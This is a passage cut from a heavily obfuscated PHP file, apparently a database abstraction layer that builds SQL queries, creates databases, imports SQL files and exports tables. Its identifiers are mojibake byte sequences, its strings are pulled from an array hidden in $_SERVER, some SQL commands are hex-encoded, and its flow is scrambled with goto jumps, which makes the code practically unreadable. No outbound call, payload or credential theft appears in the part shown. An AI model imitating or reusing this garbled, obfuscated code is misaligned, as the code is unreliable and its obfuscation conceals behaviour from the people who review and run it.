$F¨í±¡÷À[909]; if (in_array($döôöäÙ„, array($F¨í±¡÷À[908], $F¨í±¡÷À[909], $F¨í±¡÷À[910]))) { $féª®œÓî† = array(); foreach ($C¹­¯…¨³è[1] as $FöÈ½®¡») { $féª®œÓî†[] = $C™ô‡×Æé . $F¨í±¡÷À[50] . $this->exp[$cÁÜÍ¯‰ğ] . $F¨í±¡÷À[50] . $this->parseValue($FöÈ½®¡»); } $aô–ÙÂÑŒ† .= $F¨í±¡÷À[248] . implode($F¨í±¡÷À[50] . $döôöäÙ„ . $F¨í±¡÷À[50], $féª®œÓî†) . $F¨í±¡÷À[810]; } } else { $aô–ÙÂÑŒ† .= $C™ô‡×Æé . $F¨í±¡÷À[50] . $this->exp[$cÁÜÍ¯‰ğ] . $F¨í±¡÷À[50] . $this->parseValue($C¹­¯…¨³è[1]); } } elseif ($F¨í±¡÷À[285] == $cÁÜÍ¯‰ğ) { $aô–ÙÂÑŒ† .= $F¨í±¡÷À[808] . $C™ô‡×Æé . $F¨í±¡÷À[50] . $C¹­¯…¨³è[1] . $F¨í±¡÷À[925]; } elseif (preg_match($F¨í±¡÷À[926], $C¹­¯…¨³è[0])) { if (isset($C¹­¯…¨³è[2]) && $F¨í±¡÷À[285] == $C¹­¯…¨³è[2]) { $aô–ÙÂÑŒ† .= $C™ô‡×Æé . $F¨í±¡÷À[50] . $this->exp[$cÁÜÍ¯‰ğ] . $F¨í±¡÷À[50] . $C¹­¯…¨³è[1]; } else { if (is_string($C¹­¯…¨³è[1])) { $C¹­¯…¨³è[1] = explode($F¨í±¡÷À[47], $C¹­¯…¨³è[1]); } $b‰òùƒ·²¸ = implode($F¨í±¡÷À[47], $this->parseValue($C¹­¯…¨³è[1])); $aô–ÙÂÑŒ† .= $C™ô‡×Æé . $F¨í±¡÷À[50] . $this->exp[$cÁÜÍ¯‰ğ] . $F¨í±¡÷À[808] . $b‰òùƒ·²¸ . $F¨í±¡÷À[810]; } } elseif (preg_match($F¨í±¡÷À[927], $C¹­¯…¨³è[0])) { $f³²°¦Ö· = is_string($C¹­¯…¨³è[1]) ? explode($F¨í±¡÷À[47], $C¹­¯…¨³è[1]) : $C¹­¯…¨³è[1]; $aô–ÙÂÑŒ† .= $F¨í±¡÷À[808] . $C™ô‡×Æé . $F¨í±¡÷À[50] . $this->exp[$cÁÜÍ¯‰ğ] . $F¨í±¡÷À[50] . $this->parseValue($f³²°¦Ö·[0]) . $F¨í±¡÷À[911] . $this->parseValue($f³²°¦Ö·[1]) . $F¨í±¡÷À[266]; } else { think_exception(think_lang($F¨í±¡÷À[914]) . $F¨í±¡÷À[4] . $C¹­¯…¨³è[0]); } } else { $Eª®Ô÷« ñ = count($C¹­¯…¨³è); $eë¡ø¿ãï = isset($C¹­¯…¨³è[$Eª®Ô÷« ñ - 1]) ? strtoupper($C¹­¯…¨³è[$Eª®Ô÷« ñ - 1]) : $F¨í±¡÷À[33]; if (in_array($eë¡ø¿ãï, array($F¨í±¡÷À[908], $F¨í±¡÷À[909], $F¨í±¡÷À[910]))) { $Eª®Ô÷« ñ = $Eª®Ô÷« ñ - 1; } else { $eë¡ø¿ãï = $F¨í±¡÷À[908]; } for ($DÁ„İ¯”âö = 0; $DÁ„İ¯”âö < $Eª®Ô÷« ñ; $DÁ„İ¯”âö++) { $f³²°¦Ö· = is_array($C¹­¯…¨³è[$DÁ„İ¯”âö]) ? $C¹­¯…¨³è[$DÁ„İ¯”âö][1] : $C¹­¯…¨³è[$DÁ„İ¯”âö]; if ($F¨í±¡÷À[285] == strtolower($C¹­¯…¨³è[$DÁ„İ¯”âö][0])) { $aô–ÙÂÑŒ† .= $F¨í±¡÷À[248] . $C™ô‡×Æé . $F¨í±¡÷À[50] . $f³²°¦Ö· . $F¨í±¡÷À[925] . $eë¡ø¿ãï . $F¨í±¡÷À[50]; } else { $cÊ¤Â©¨îê = is_array($C¹­¯…¨³è[$DÁ„İ¯”âö]) ? $this->exp[strtolower($C¹­¯…¨³è[$DÁ„İ¯”âö][0])] : $F¨í±¡÷À[900]; if (!$cÊ¤Â©¨îê && is_array($C¹­¯…¨³è[$DÁ„İ¯”âö]) && in_array($C¹­¯…¨³è[$DÁ„İ¯”âö][0], array($F¨í±¡÷À[900], $F¨í±¡÷À[918], $F¨í±¡÷À[919], $F¨í±¡÷À[920], $F¨í±¡÷À[921], $F¨í±¡÷À[922]))) { $cÊ¤Â©¨îê = $C¹­¯…¨³è[$DÁ„İ¯”âö][0]; } $aô–ÙÂÑŒ† .= $F¨í±¡÷À[248] . $C™ô‡×Æé . $F¨í±¡÷À[50] . $cÊ¤Â©¨îê . $F¨í±¡÷À[50] . $this->parseValue($f³²°¦Ö·) . $F¨í±¡÷À[925] . $eë¡ø¿ãï . $F¨í±¡÷À[50]; } } $aô–ÙÂÑŒ† = substr($aô–ÙÂÑŒ†, 0, -4); } } else { $aô–ÙÂÑŒ† .= $C™ô‡×Æé . $F¨í±¡÷À[928] . $this->parseValue($C¹­¯…¨³è); } return $aô–ÙÂÑŒ†; } protected function parseThinkWhere($b¹£ñ‘­, $f¦ø‚ŒÂÍ) { $C®ƒé”ÃÜõ =& $_SERVER[Î¿—”òá]; $CĞÀÜàÕ‰® = $C®ƒé”ÃÜõ[33]; switch ($b¹£ñ‘­) { case $C®ƒé”ÃÜõ[339]: $CĞÀÜàÕ‰® = $f¦ø‚ŒÂÍ; break; case $C®ƒé”ÃÜõ[912]: $CĞÀÜàÕ‰® = is_string($f¦ø‚ŒÂÍ) ? $f¦ø‚ŒÂÍ : substr($this->parseWhere($f¦ø‚ŒÂÍ), 6); break; case $C®ƒé”ÃÜõ[929]: parse_str($f¦ø‚ŒÂÍ, $DòÃ¾ÌôãĞ); if (isset($DòÃ¾ÌôãĞ[$C®ƒé”ÃÜõ[907]])) { $fèÀ»… = $C®ƒé”ÃÜõ[50] . strtoupper($DòÃ¾ÌôãĞ[$C®ƒé”ÃÜõ[907]]) . $C®ƒé”ÃÜõ[50]; unset($DòÃ¾ÌôãĞ[$C®ƒé”ÃÜõ[907]]); } else { $fèÀ»… = $C®ƒé”ÃÜõ[911]; } $BÙ³¹…­è = array(); foreach ($DòÃ¾ÌôãĞ as $Eµ´Ï±Óé† => $fèêˆÍÀ•ö) { $BÙ³¹…­è[] = $this->parseKey($Eµ´Ï±Óé†) . $C®ƒé”ÃÜõ[928] . $this->parseValue($fèêˆÍÀ•ö); } $CĞÀÜàÕ‰® = implode($fèÀ»…, $BÙ³¹…­è); break; } return $CĞÀÜàÕ‰®; } protected function parseLimit($Fƒ¯—¿³Ì) { $AŞÏ¸¨òš =& $_SERVER[Î¿—”òá]; return !empty($Fƒ¯—¿³Ì) ? $AŞÏ¸¨òš[48] . $Fƒ¯—¿³Ì . $AŞÏ¸¨òš[50] : $AŞÏ¸¨òš[33]; } protected function parseJoin($C¼Ãì‹™İ·) { $CÆÃƒôîÔº =& $_SERVER[Î¿—”òá]; $a°ìÁˆÎÂÍ = $CÆÃƒôîÔº[33]; if (!empty($C¼Ãì‹™İ·)) { if (is_array($C¼Ãì‹™İ·)) { foreach ($C¼Ãì‹™İ· as $dºï¬Š¡õ => $fÑïĞ¿›˜Â) { if (!1 !== stripos($fÑïĞ¿›˜Â, $CÆÃƒôîÔº[930])) { $a°ìÁˆÎÂÍ .= $CÆÃƒôîÔº[50] . $fÑïĞ¿›˜Â; } else { $a°ìÁˆÎÂÍ .= $CÆÃƒôîÔº[931] . $fÑïĞ¿›˜Â; } } } else { $a°ìÁˆÎÂÍ .= $CÆÃƒôîÔº[931] . $C¼Ãì‹™İ·; } } $a°ìÁˆÎÂÍ = preg_replace($CÆÃƒôîÔº[932], think_config($CÆÃƒôîÔº[835]) . $CÆÃƒôîÔº[933], $a°ìÁˆÎÂÍ); return $a°ìÁˆÎÂÍ; } protected function parseOrder($Cˆ óÈÛ‚) { $F©Ãœ‚±µ‹ =& $_SERVER[Î¿—”òá]; if (is_array($Cˆ óÈÛ‚)) { $CÍÑš“‹¡Ã = array(); foreach ($Cˆ óÈÛ‚ as $bÎŞ¶µìáÉ => $b…åç²Ö·Ú) { if (is_numeric($bÎŞ¶µìáÉ)) { $CÍÑš“‹¡Ã[] = $this->parseKey($b…åç²Ö·Ú); } else { $b…åç²Ö·Ú = in_array(strtoupper(trim($b…åç²Ö·Ú)), array($F©Ãœ‚±µ‹[934], $F©Ãœ‚±µ‹[935])) ? $F©Ãœ‚±µ‹[50] . $b…åç²Ö·Ú : $F©Ãœ‚±µ‹[33]; if (preg_match($F©Ãœ‚±µ‹[936], $bÎŞ¶µìáÉ)) { $CÍÑš“‹¡Ã[] = $this->parseKey($bÎŞ¶µìáÉ) . $b…åç²Ö·Ú; } else { think_exception($F©Ãœ‚±µ‹[937] . $bÎŞ¶µìáÉ); } } } $Cˆ óÈÛ‚ = implode($F©Ãœ‚±µ‹[47], $CÍÑš“‹¡Ã); } return !empty($Cˆ óÈÛ‚) ? $F©Ãœ‚±µ‹[938] . $Cˆ óÈÛ‚ : $F©Ãœ‚±µ‹[33]; } protected function parseGroup($c†íŒš°ŠÑ) { $f¦æÈò’•Æ =& $_SERVER[Î¿—”òá]; return !empty($c†íŒš°ŠÑ) ? $f¦æÈò’•Æ[939] . $c†íŒš°ŠÑ : $f¦æÈò’•Æ[33]; } protected function parseHaving($aªÜĞ÷§Î) { $C†”³Æìï› =& $_SERVER[Î¿—”òá]; return !empty($aªÜĞ÷§Î) ? $C†”³Æìï›[940] . $aªÜĞ÷§Î : $C†”³Æìï›[33]; } protected function parseComment($e½ƒ²§ƒ»œ) { $e­Æµšµ• =& $_SERVER[Î¿—”òá]; return !empty($e½ƒ²§ƒ»œ) ? $e­Æµšµ•[941] . $e½ƒ²§ƒ»œ . $e­Æµšµ•[942] : $e­Æµšµ•[33]; } protected function parseDistinct($eŒ¶Ì’ÕŒ) { $f‘›çÒğéˆ =& $_SERVER[Î¿—”òá]; return !empty($eŒ¶Ì’ÕŒ) ? $f‘›çÒğéˆ[943] : $f‘›çÒğéˆ[33]; } protected function parseUnion($DÔÍà•Ğ) { $C×ŒÛÏ¯Èè =& $_SERVER[Î¿—”òá]; if (empty($DÔÍà•Ğ)) { return $C×ŒÛÏ¯Èè[33]; } if (isset($DÔÍà•Ğ[$C×ŒÛÏ¯Èè[336]])) { $C°ä‘İêÓ— = $C×ŒÛÏ¯Èè[944]; unset($DÔÍà•Ğ[$C×ŒÛÏ¯Èè[336]]); } else { $C°ä‘İêÓ— = $C×ŒÛÏ¯Èè[945]; } foreach ($DÔÍà•Ğ as $eÓÒğİâšÈ) { $a‘‹¿ç„áÃ[] = $C°ä‘İêÓ— . (is_array($eÓÒğİâšÈ) ? $this->buildSelectSql($eÓÒğİâšÈ) : $eÓÒğİâšÈ); } return implode($C×ŒÛÏ¯Èè[50], $a‘‹¿ç„áÃ); } public function insert($FĞ¡´˜Ã‹•, $Dïé—ÀÑ–› = array(), $eİÅ«ØÆÏ‡ = false) { goto FŠ»ÀÊªÂÖ; FŠ»ÀÊªÂÖ: $B³ãÅ‹Ó =& $_SERVER[Î¿—”òá]; $aÁíõĞ³¹Ğ = $aÂ÷ë¿Ì–ë = array(); $this->model = $Dïé—ÀÑ–›[$B³ãÅ‹Ó[269]]; goto cî¢ØõïòŠ; cî¢ØõïòŠ: foreach ($FĞ¡´˜Ã‹• as $b»Ÿ¡†ÙÕ => $fµÍø¡á) { if (is_array($fµÍø¡á) && $B³ãÅ‹Ó[285] == $fµÍø¡á[0]) { $aÂ÷ë¿Ì–ë[] = $this->parseKey($b»Ÿ¡†ÙÕ); $aÁíõĞ³¹Ğ[] = $fµÍø¡á[1]; } elseif (is_scalar($fµÍø¡á) || is_null($fµÍø¡á)) { $aÂ÷ë¿Ì–ë[] = $this->parseKey($b»Ÿ¡†ÙÕ); $aÁíõĞ³¹Ğ[] = $this->parseValue($fµÍø¡á); } } $A°‚ë¤ÌØÅ = ($eİÅ«ØÆÏ‡ ? $B³ãÅ‹Ó[812] : $B³ãÅ‹Ó[813]) . $B³ãÅ‹Ó[814] . $this->parseTable($Dïé—ÀÑ–›[$B³ãÅ‹Ó[267]]) . $B³ãÅ‹Ó[808] . implode($B³ãÅ‹Ó[47], $aÂ÷ë¿Ì–ë) . $B³ãÅ‹Ó[809] . implode($B³ãÅ‹Ó[47], $aÁíõĞ³¹Ğ) . $B³ãÅ‹Ó[810]; $A°‚ë¤ÌØÅ .= $this->parseLock(isset($Dïé—ÀÑ–›[$B³ãÅ‹Ó[768]]) ? $Dïé—ÀÑ–›[$B³ãÅ‹Ó[768]] : !1); goto bè„……ê¼±; bè„……ê¼±: $A°‚ë¤ÌØÅ .= $this->parseComment(!empty($Dïé—ÀÑ–›[$B³ãÅ‹Ó[341]]) ? $Dïé—ÀÑ–›[$B³ãÅ‹Ó[341]] : $B³ãÅ‹Ó[33]); return $this->execute($A°‚ë¤ÌØÅ, $this->parseBind(!empty($Dïé—ÀÑ–›[$B³ãÅ‹Ó[273]]) ? $Dïé—ÀÑ–›[$B³ãÅ‹Ó[273]] : array())); goto FéÙ¦ˆøÓî; FéÙ¦ˆøÓî: } public function selectInsert($BÃäíŒœ±, $e£×ì‘ÕÉ, $DæÑÓáŒ = array()) { goto A°ãµÅˆèŒ; e›ñùØ‡£: array_walk($BÃäíŒœ±, array($this, $F‡é×ğè‹·[811])); $fÔ¡¢ëíç¨ = $F‡é×ğè‹·[946] . $this->parseTable($e£×ì‘ÕÉ) . $F‡é×ğè‹·[808] . implode($F‡é×ğè‹·[47], $BÃäíŒœ±) . $F‡é×ğè‹·[925]; $fÔ¡¢ëíç¨ .= $this->buildSelectSql($DæÑÓáŒ); goto cíŒ™«‡¶Í; cíŒ™«‡¶Í: return $this->execute($fÔ¡¢ëíç¨, $this->parseBind(!empty($DæÑÓáŒ[$F‡é×ğè‹·[273]]) ? $DæÑÓáŒ[$F‡é×ğè‹·[273]] : array())); goto FÒñß¡Î£³; A°ãµÅˆèŒ: $F‡é×ğè‹· =& $_SERVER[Î¿—”òá]; $this->model = $DæÑÓáŒ[$F‡é×ğè‹·[269]]; if (is_string($BÃäíŒœ±)) { $BÃäíŒœ± = explode($F‡é×ğè‹·[47], $BÃäíŒœ±); } goto e›ñùØ‡£; FÒñß¡Î£³: } public function update($f–ê¨­ÖãŸ, $A§ªÚ×’Œ—) { $Dâ‚ŸÚÈÑ° =& $_SERVER[Î¿—”òá]; $this->model = $A§ªÚ×’Œ—[$Dâ‚ŸÚÈÑ°[269]]; $d•¸Ä‹œÀé = $Dâ‚ŸÚÈÑ°[947] . $this->parseTable($A§ªÚ×’Œ—[$Dâ‚ŸÚÈÑ°[267]]) . $this->parseSet($f–ê¨­ÖãŸ) . $this->parseWhere(!empty($A§ªÚ×’Œ—[$Dâ‚ŸÚÈÑ°[263]]) ? $A§ªÚ×’Œ—[$Dâ‚ŸÚÈÑ°[263]] : $Dâ‚ŸÚÈÑ°[33]) . $this->parseOrder(!empty($A§ªÚ×’Œ—[$Dâ‚ŸÚÈÑ°[350]]) ? $A§ªÚ×’Œ—[$Dâ‚ŸÚÈÑ°[350]] : $Dâ‚ŸÚÈÑ°[33]) . $this->parseLimit(!empty($A§ªÚ×’Œ—[$Dâ‚ŸÚÈÑ°[280]]) ? $A§ªÚ×’Œ—[$Dâ‚ŸÚÈÑ°[280]] : $Dâ‚ŸÚÈÑ°[33]) . $this->parseLock(isset($A§ªÚ×’Œ—[$Dâ‚ŸÚÈÑ°[768]]) ? $A§ªÚ×’Œ—[$Dâ‚ŸÚÈÑ°[768]] : !1) . $this->parseComment(!empty($A§ªÚ×’Œ—[$Dâ‚ŸÚÈÑ°[341]]) ? $A§ªÚ×’Œ—[$Dâ‚ŸÚÈÑ°[341]] : $Dâ‚ŸÚÈÑ°[33]); return $this->execute($d•¸Ä‹œÀé, $this->parseBind(!empty($A§ªÚ×’Œ—[$Dâ‚ŸÚÈÑ°[273]]) ? $A§ªÚ×’Œ—[$Dâ‚ŸÚÈÑ°[273]] : array())); } public function delete($C¦•×£‡š = array()) { $d‰¯³ëÊ­ß =& $_SERVER[Î¿—”òá]; $this->model = $C¦•×£‡š[$d‰¯³ëÊ­ß[269]]; $A»ôÙª×À™ = $d‰¯³ëÊ­ß[948] . $this->parseTable($C¦•×£‡š[$d‰¯³ëÊ­ß[267]]) . $this->parseWhere(!empty($C¦•×£‡š[$d‰¯³ëÊ­ß[263]]) ? $C¦•×£‡š[$d‰¯³ëÊ­ß[263]] : $d‰¯³ëÊ­ß[33]) . $this->parseOrder(!empty($C¦•×£‡š[$d‰¯³ëÊ­ß[350]]) ? $C¦•×£‡š[$d‰¯³ëÊ­ß[350]] : $d‰¯³ëÊ­ß[33]) . $this->parseLimit(!empty($C¦•×£‡š[$d‰¯³ëÊ­ß[280]]) ? $C¦•×£‡š[$d‰¯³ëÊ­ß[280]] : $d‰¯³ëÊ­ß[33]) . $this->parseLock(isset($C¦•×£‡š[$d‰¯³ëÊ­ß[768]]) ? $C¦•×£‡š[$d‰¯³ëÊ­ß[768]] : !1) . $this->parseComment(!empty($C¦•×£‡š[$d‰¯³ëÊ­ß[341]]) ? $C¦•×£‡š[$d‰¯³ëÊ­ß[341]] : $d‰¯³ëÊ­ß[33]); return $this->execute($A»ôÙª×À™, $this->parseBind(!empty($C¦•×£‡š[$d‰¯³ëÊ­ß[273]]) ? $C¦•×£‡š[$d‰¯³ëÊ­ß[273]] : array())); } public function select($DİÖ»öŸ–÷ = array()) { goto CÛ¡ÆÄ”Š¤; CÛ¡ÆÄ”Š¤: $Bˆù‡Ê¦… =& $_SERVER[Î¿—”òá]; $this->model = $DİÖ»öŸ–÷[$Bˆù‡Ê¦…[269]]; $CîŸ¢ğª‰Ï = $this->buildSelectSql($DİÖ»öŸ–÷); goto bƒ¼Å“ÄÍ; bƒ¼Å“ÄÍ: $C‡ïÚëˆŒï = isset($DİÖ»öŸ–÷[$Bˆù‡Ê¦…[337]]) ? $DİÖ»öŸ–÷[$Bˆù‡Ê¦…[337]] : !1; if ($C‡ïÚëˆŒï) { $B½øŒù®‚ = is_string($C‡ïÚëˆŒï[$Bˆù‡Ê¦…[89]]) ? $C‡ïÚëˆŒï[$Bˆù‡Ê¦…[89]] : $Bˆù‡Ê¦…[949] . md5($CîŸ¢ğª‰Ï); $e»ŞÈÚÑòâ = think_cache($B½øŒù®‚, $Bˆù‡Ê¦…[33], $C‡ïÚëˆŒï); if (!1 !== $e»ŞÈÚÑòâ) { return $e»ŞÈÚÑòâ; } } $cçÏ²èº÷¸ = $this->query($CîŸ¢ğª‰Ï, $this->parseBind(!empty($DİÖ»öŸ–÷[$Bˆù‡Ê¦…[273]]) ? $DİÖ»öŸ–÷[$Bˆù‡Ê¦…[273]] : array())); goto d©œ´Ê×á‡; d©œ´Ê×á‡: if ($C‡ïÚëˆŒï && !1 !== $cçÏ²èº÷¸) { think_cache($B½øŒù®‚, $cçÏ²èº÷¸, $C‡ïÚëˆŒï); } return $cçÏ²èº÷¸; goto fá²°îÖ; fá²°îÖ: } public function buildSelectSql($c‘ÏÎğ‡×ç = array()) { goto AÁ†£¸÷‰Å; a–Åœ¦²ƒó: $cªÅï‰ƒ¸® = $this->parseSql($this->selectSql, $c‘ÏÎğ‡×ç); $cªÅï‰ƒ¸® .= $this->parseLock(isset($c‘ÏÎğ‡×ç[$D›ËÛçÃÄ[768]]) ? $c‘ÏÎğ‡×ç[$D›ËÛçÃÄ[768]] : !1); if (isset($c¶èÎÂŸÁ)) { think_cache($c¶èÎÂŸÁ, $cªÅï‰ƒ¸®); } goto cƒ¡ùŞ÷ñ‹; cƒ¡ùŞ÷ñ‹: return $cªÅï‰ƒ¸®; goto a¹Ş§ŞƒñÖ; AÁ†£¸÷‰Å: $D›ËÛçÃÄ =& $_SERVER[Î¿—”òá]; if (isset($c‘ÏÎğ‡×ç[$D›ËÛçÃÄ[340]])) { if (strpos($c‘ÏÎğ‡×ç[$D›ËÛçÃÄ[340]], $D›ËÛçÃÄ[47])) { list($fã˜À¢»Ì, $E–™ÀÅÑ) = explode($D›ËÛçÃÄ[47], $c‘ÏÎğ‡×ç[$D›ËÛçÃÄ[340]]); } else { $fã˜À¢»Ì = $c‘ÏÎğ‡×ç[$D›ËÛçÃÄ[340]]; } $fã˜À¢»Ì = $fã˜À¢»Ì ? $fã˜À¢»Ì : 1; $E–™ÀÅÑ = isset($E–™ÀÅÑ) ? $E–™ÀÅÑ : (is_numeric($c‘ÏÎğ‡×ç[$D›ËÛçÃÄ[280]]) ? $c‘ÏÎğ‡×ç[$D›ËÛçÃÄ[280]] : 20); $AÜ”¥ÀÔİß = $E–™ÀÅÑ * ((int) $fã˜À¢»Ì - 1); $c‘ÏÎğ‡×ç[$D›ËÛçÃÄ[280]] = $AÜ”¥ÀÔİß . $D›ËÛçÃÄ[47] . $E–™ÀÅÑ; } if (think_config($D›ËÛçÃÄ[950])) { $c¶èÎÂŸÁ = $D›ËÛçÃÄ[951] . md5(serialize($c‘ÏÎğ‡×ç)); $d—£²Ó¬‚Ë = think_cache($c¶èÎÂŸÁ); if ($d—£²Ó¬‚Ë) { return $d—£²Ó¬‚Ë; } } goto a–Åœ¦²ƒó; a¹Ş§ŞƒñÖ: } public function parseSql($d«ÇÙÌ¥î£, $CíİÄ»ÎÙ = array()) { $e’„Û‡»É =& $_SERVER[Î¿—”òá]; $d«ÇÙÌ¥î£ = str_replace(array($e’„Û‡»É[952], $e’„Û‡»É[953], $e’„Û‡»É[954], $e’„Û‡»É[955], $e’„Û‡»É[956], $e’„Û‡»É[957], $e’„Û‡»É[958], $e’„Û‡»É[959], $e’„Û‡»É[960], $e’„Û‡»É[961], $e’„Û‡»É[962]), array($this->parseTable("{$CíİÄ»ÎÙ[$e’„Û‡»É[267]]}"), $this->parseDistinct(isset($CíİÄ»ÎÙ[$e’„Û‡»É[963]]) ? $CíİÄ»ÎÙ[$e’„Û‡»É[963]] : !1), $this->parseField(!empty($CíİÄ»ÎÙ[$e’„Û‡»É[261]]) ? $CíİÄ»ÎÙ[$e’„Û‡»É[261]] : $e’„Û‡»É[176]), $this->parseJoin(!empty($CíİÄ»ÎÙ[$e’„Û‡»É[270]]) ? $CíİÄ»ÎÙ[$e’„Û‡»É[270]] : $e’„Û‡»É[33]), $this->parseWhere(!empty($CíİÄ»ÎÙ[$e’„Û‡»É[263]]) ? $CíİÄ»ÎÙ[$e’„Û‡»É[263]] : $e’„Û‡»É[33]), $this->parseGroup(!empty($CíİÄ»ÎÙ[$e’„Û‡»É[964]]) ? $CíİÄ»ÎÙ[$e’„Û‡»É[964]] : $e’„Û‡»É[33]), $this->parseHaving(!empty($CíİÄ»ÎÙ[$e’„Û‡»É[965]]) ? $CíİÄ»ÎÙ[$e’„Û‡»É[965]] : $e’„Û‡»É[33]), $this->parseOrder(!empty($CíİÄ»ÎÙ[$e’„Û‡»É[350]]) ? $CíİÄ»ÎÙ[$e’„Û‡»É[350]] : $e’„Û‡»É[33]), $this->parseLimit(!empty($CíİÄ»ÎÙ[$e’„Û‡»É[280]]) ? $CíİÄ»ÎÙ[$e’„Û‡»É[280]] : $e’„Û‡»É[33]), $this->parseUnion(!empty($CíİÄ»ÎÙ[$e’„Û‡»É[335]]) ? $CíİÄ»ÎÙ[$e’„Û‡»É[335]] : $e’„Û‡»É[33]), $this->parseComment(!empty($CíİÄ»ÎÙ[$e’„Û‡»É[341]]) ? $CíİÄ»ÎÙ[$e’„Û‡»É[341]] : $e’„Û‡»É[33])), $d«ÇÙÌ¥î£); return $d«ÇÙÌ¥î£; } public function getLastSql($Cí¨œÍÅÓÊ = '') { return $Cí¨œÍÅÓÊ ? $this->modelSql[$Cí¨œÍÅÓÊ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($aƒªÇİ™æù) { return addslashes($aƒªÇİ™æù); } public function setModel($D¹±ã™ÑÍ) { $this->model = $D¹±ã™ÑÍ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($aøôˆÁ‚Ğ“, $dí¦™—¾Â¢ = '') { $this->database = $aøôˆÁ‚Ğ“; $this->type = $dí¦™—¾Â¢; } public function model($a¡‹Ù¸‰ÉÂ = '') { return new ModelBase($a¡‹Ù¸‰ÉÂ, $_SERVER[Î¿—”òá][33], $this->database); } public function db($b¼™áê ÙÊ = false) { goto A…ÃåìŒÃ; D…º„§†î: $dÖÈìğ² = $fÙ¡Ö·°°·[$fâÀø„œÅë[878]]; $fÙ¡Ö·°°·[$fâÀø„œÅë[878]] = $fâÀø„œÅë[33]; if ($fÙ¡Ö·°°·[$fâÀø„œÅë[719]] == $fâÀø„œÅë[720]) { $fŞèš‚£ï = $fÙ¡Ö·°°·[$fâÀø„œÅë[721]]; $fÙ¡Ö·°°·[$fâÀø„œÅë[721]] = substr($fŞèš‚£ï, 0, strrpos($fŞèš‚£ï, $fâÀø„œÅë[966])); } goto E¸àÏ¢À•–; fï„ÕŠ‘Éö: $this->database = $fÙ¡Ö·°°·; $A¢ÓÙ—âÍå->execute("\x75\x73\x65\x20\140{$dÖÈìğ²}\x60"); return $A¢ÓÙ—âÍå; goto d°öŠ²¡àë; E¸àÏ¢À•–: $this->database = $fÙ¡Ö·°°·; $A¢ÓÙ—âÍå = $this->model()->db(); try { $d·âÓšÀİê = $A¢ÓÙ—âÍå->execute("\163\x68\157\x77\40\144\x61\164\x61\142\141\x73\x65\x73\x20\x6c\151\153\x65\40\x27{$dÖÈìğ²}\x27"); } catch (Exception $A„¬íÒÑÄ) { } goto bà´«ÍÖƒ¯; bà´«ÍÖƒ¯: if (!$d·âÓšÀİê) { $A¢ÓÙ—âÍå->execute("\x63\162\145\x61\x74\145\x20\x64\141\x74\141\x62\x61\x73\x65\x20\x60{$dÖÈìğ²}\x60"); } $fÙ¡Ö·°°·[$fâÀø„œÅë[878]] = $dÖÈìğ²; if ($fÙ¡Ö·°°·[$fâÀø„œÅë[719]] == $fâÀø„œÅë[720]) { $fÙ¡Ö·°°·[$fâÀø„œÅë[721]] .= $fâÀø„œÅë[966] . $dÖÈìğ²; } goto fï„ÕŠ‘Éö; A…ÃåìŒÃ: $fâÀø„œÅë =& $_SERVER[Î¿—”òá]; $fÙ¡Ö·°°· = array_change_key_case($this->database); if ($this->type == $fâÀø„œÅë[9] || !$b¼™áê ÙÊ) { return $this->model()->db(); } goto D…º„§†î; d°öŠ²¡àë: } public function createTable($eÕ™š‘ó™½, $A¡¡îæ–¯œ = null) { $eºî÷µ¹” =& $_SERVER[Î¿—”òá]; if (!IO::exist($eÕ™š‘ó™½)) { show_json(LNG($eºî÷µ¹”[967]), !1); } $dÖÙ ùÜ®Â = sqlSplit(IO::getContent($eÕ™š‘ó™½)); foreach ($dÖÙ ùÜ®Â as $E¿¶æŠÕ¥˜) { if ($A¡¡îæ–¯œ) { $cä™àá“ = stripos($E¿¶æŠÕ¥˜, $eºî÷µ¹”[968]) === 0; if ($cä™àá“) { $A¡¡îæ–¯œ->task[$eºî÷µ¹”[969]] += 1; } } $this->model()->db()->execute($E¿¶æŠÕ¥˜); if ($A¡¡îæ–¯œ && $cä™àá“) { preg_match($eºî÷µ¹”[970], $E¿¶æŠÕ¥˜, $cÈ²ê¢ºÁ·); $A¡¡îæ–¯œ->task[$eºî÷µ¹”[971]] = $cÈ²ê¢ºÁ·[1]; $A¡¡îæ–¯œ->update(1); } } $this->taskToCache($A¡¡îæ–¯œ); } public function insertTable($CŠñíó‰ƒ, $aí±¥„¦íÆ = null) { $Bææ„‚‹¦ =& $_SERVER[Î¿—”òá]; $c¿Ç¶¯Ç÷ = $this->model()->db(); $DÑÁËÜ‘ˆ³ = $dßåñæÄ¬ ? array($dßåñæÄ¬) : $c¿Ç¶¯Ç÷->getTables(); foreach ($CŠñíó‰ƒ as $bÜ…ñÛ‘‹ø) { $dßåñæÄ¬ = basename($bÜ…ñÛ‘‹ø, $Bææ„‚‹¦[714]); if (!in_array($dßåñæÄ¬, $DÑÁËÜ‘ˆ³)) { continue; } if ($aí±¥„¦íÆ) { $aí±¥„¦íÆ->task[$Bææ„‚‹¦[971]] = $dßåñæÄ¬; } if (get_filesize($bÜ…ñÛ‘‹ø) == 0) { continue; } $eŒïÑ½—â‰ = $this->sqlToDb($bÜ…ñÛ‘‹ø, $aí±¥„¦íÆ); if (!$eŒïÑ½—â‰) { show_json(LNG($Bææ„‚‹¦[972]) . "\x5b{$dßåñæÄ¬}\x5d", !1); } } $this->taskToCache($aí±¥„¦íÆ); } public function sqlFromDb($eÇŒ”Àø½, $F˜Õ˜Û…ë¼, $c‹Î»¬¿Œ = null, $EŒï¬­Ìå´ = null) { goto D…´İÙ¿õÖ; D…´İÙ¿õÖ: if ($c‹Î»¬¿Œ) { $c‹Î»¬¿Œ->task[$_SERVER[Î¿—”òá][971]] = $eÇŒ”Àø½; } $d£…×Ø¦ã‘ = $this->model($eÇŒ”Àø½); $DâÔ½Õ’Êœ = 0; goto eÓÏˆµ’ÌÎ; D‹Ó¢±à®³: fclose($cÔËíÈ‹—á); return $DâÔ½Õ’Êœ; goto dğôŞ¢’¥­; eÓÏˆµ’ÌÎ: $a´«£•Ú´º = 1; $dËğÎ¬µç¢ = 500; $cÔËíÈ‹—á = fopen($F˜Õ˜Û…ë¼, $_SERVER[Î¿—”òá][973]); goto fµÔÌÇÖÑ; fµÔÌÇÖÑ: $a§ÖƒÌøŸš = $d£…×Ø¦ã‘->getPk(); $f°¸ñÇ¢Åƒ = $d£…×Ø¦ã‘->getDbFields(); do { $dØ±˜ìÖˆ = 